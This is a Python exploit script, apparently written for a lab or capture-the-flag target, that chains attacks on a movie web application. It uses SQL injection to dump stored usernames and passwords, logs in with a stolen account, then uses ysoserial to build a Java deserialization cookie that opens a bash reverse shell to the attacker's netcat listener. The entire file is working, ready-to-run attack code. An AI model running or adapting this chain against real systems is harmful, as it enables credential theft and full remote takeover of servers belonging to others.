import requests, json, argparse, os

''' Carry out the SQL injection attack and return the credentials'''
def sql_injection_attack():

    # send the SQLi request
    print("[+] Carrying out SQLi attack...")
    url = "http://%s:8080/rest/movie?title='+UNION+SELECT+password,'',name,id+FROM+appuser;--" % target 
    r = session.get(url)

    # get the json response
    j = json.loads(r.text)

    # store the last account, doesn't matter which we use
    credentials = ""

    # we need a way to distinguish between an account and a movie record
    # I decided to look at the length of the description string
    print("[+] Dumping accounts...")
    for record in j:
        if len(record["description"]) < 40:
            print("    [-] " + record["genre"] + ":" + record["description"])
            credentials = record["genre"] + ":" + record["description"]

    return credentials

''' Login to the application so we can abuse the cookie '''
def login():
    print("[+] Logging in to the web app...")
    url = "http://%s:8080/login" % target 

    r = session.post(url, data = {"username":username,"password":password})

''' This is where we generate a malicious cookie and store it in the global value '''
def generate_payload():

    # we are using java and ysoserial to generate a serialized object to exploit the application
    print("[+] Using ysoserial to generate a reverse shell payload...")
    cmd = "payload=`echo \"bash -i >& /dev/tcp/" + lhost + "/" + lport + " 0>&1\" | base64 -w0`;java -jar ysoserial-all.jar CommonsCollections2 \"bash -c {echo,$payload}|{base64,-d}|{bash,-i}\" 2>/dev/null | base64 -w0"

    # execute the command and capture the output
    output = os.popen(cmd)
    return output.read()

def remote_code_execution():
    print("[+] Carrying out Java deserialization attack...")

    # change the cookie to the malicious base64
    session.cookies.set('USER_AUTHENTICATION_EXTRA_SECURITY', cookie, path='/')

    # make the endpoint request
    url = "http://%s:8080/rest/movie" % target
    session.get(url)

''' This is where the arguments are parsed/configured '''
def parse_args(parser):
    parser.add_argument('--target', '-t', type=str, action='store', required=True, default = "127.0.0.1",
                    help='The target IP address to attack.')
    parser.add_argument('--lhost', '-l', type=str, action='store', required=True, default = "127.0.0.1",
                    help='The IP address of your netcat listener.')
    parser.add_argument('--lport', '-p', type=str, action='store', required=False, default = "4444",
                    help='The port of your netcat listener.')


''' This is the entry point for the script '''
''' Here we parse any arguments and set up the attack (global vars etc.) '''
''' Finally we call the functions to carry out the chained attack '''
def main():
    # parsed arguments
    parser = argparse.ArgumentParser()
    parse_args(parser)
    args = parser.parse_args()

    print("[!] Don't forget to start your Netcat listener!")
    input("[!] Press enter to start...")

    # global variables
    global session
    global target
    global lhost
    global lport
    global username
    global password
    global cookie

    # assign parsed args
    target = args.target
    lhost = args.lhost
    lport = args.lport

    # begin the attack chain - set up a session
    session = requests.Session()

    # 
    # SQLinjection attack and store the username and password
    creds = sql_injection_attack()
    print("[+] Will use credentials: " + creds)

    # split the creds so we can use them to log in
    username = creds.split(":")[0]
    password = creds.split(":")[1]

    # Log in to the web application
    login()

    # Generate a reverse shell exploit using ysoserial
    cookie = generate_payload()

    # Send the malicious cookie
    remote_code_execution()

    print("[+] Have a nice day!")

if __name__ == "__main__":
    main()
